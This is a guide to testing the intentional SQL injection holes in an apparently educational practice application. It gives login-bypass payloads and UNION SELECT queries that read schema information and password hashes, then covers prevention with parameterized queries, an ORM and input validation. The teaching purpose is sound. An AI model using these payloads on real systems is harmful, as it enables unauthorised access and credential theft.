# SQL Injection Testing Guide

This document provides examples on how to test the intentional SQL Injection vulnerabilities in this application.

## Prerequisites
- The application has been set up with initial test users using `seed_database.py`
- The application is running with `python app.py`

## 1. Login Page SQL Injection

The login page at `/login` is vulnerable to SQL injection through the `username` field.

### Basic Authentication Bypass

Try these examples to bypass authentication:

1. Username: `' OR '1'='1`  
   Password: `anything`  
   **Expected result**: Login successful as the first user in the database (likely admin)

2. Username: `' OR 1=1 --`  
   Password: `anything`  
   **Expected result**: Login successful, password check bypassed

3. Username: `admin' --`  
   Password: `anything`  
   **Expected result**: Login as admin without knowing the password

### Revealing User Information

1. Username: `' UNION SELECT 1,username,email,'password',created_at FROM users --`  
   Password: `anything`  
   **Expected result**: May reveal username/email information in error messages

## 2. User Search SQL Injection

The admin user page at `/admin/users` has a search function vulnerable to SQL injection.

Try these searches to extract database information:

1. Search: `' OR '1'='1`  
   **Expected result**: Shows all users regardless of search term

2. Search: `' UNION SELECT 1, name, sql, '4', '5' FROM sqlite_master WHERE type='table' --`  
   **Expected result**: Reveals database table structure

3. Search: `' UNION SELECT 1, name, sql, '4', '5' FROM sqlite_master WHERE type='table' AND name='users' --`  
   **Expected result**: Shows structure of the users table

4. Search: `something' AND 1=0 UNION SELECT 1, username, password, '4', '5' FROM users --`  
   **Expected result**: Reveals hashed passwords

## Debugging the SQL Injection

The application has been configured to print SQL queries to the terminal. When you perform a 
SQL injection attack, check the terminal output to see the actual SQL query being executed.

## Prevention Techniques

In a real application, you would prevent SQL injection by:

1. Using parameterized queries:
   ```python
   cursor.execute('SELECT * FROM users WHERE username = ?', (username,))
   ```

2. Using an ORM (Object-Relational Mapper) like SQLAlchemy:
   ```python
   user = User.query.filter_by(username=username).first()
   ```

3. Input validation and sanitization:
   ```python
   if not re.match(r'^[a-zA-Z0-9_]+$', username):
       return "Invalid username format"
   ```

## IMPORTANT SECURITY NOTICE

This application was created SOLELY for educational purposes to demonstrate 
SQL injection vulnerabilities. NEVER use these techniques on real websites 
or applications without explicit permission, as doing so is illegal and unethical.
